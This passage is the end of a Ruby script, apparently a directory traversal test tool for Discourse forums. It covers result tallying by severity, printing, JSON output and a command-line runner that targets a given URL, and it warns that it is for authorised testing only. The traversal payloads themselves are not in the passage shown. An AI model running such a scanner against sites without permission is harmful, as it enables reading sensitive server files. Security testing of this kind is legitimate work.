      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} directory traversal: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE DIRECTORY TRAVERSAL TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    filename = 'discourse_directory_traversal_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse Directory Traversal Test Suite\n\n"
    opts.banner += "Usage: ruby discourse_directory_traversal.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_directory_traversal.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseDirectoryTraversal.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nüö® CRITICAL: Directory traversal vulnerabilities found!"
      puts "   Sensitive file access possible!"
    else
      puts "\n‚úÖ No directory traversal vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end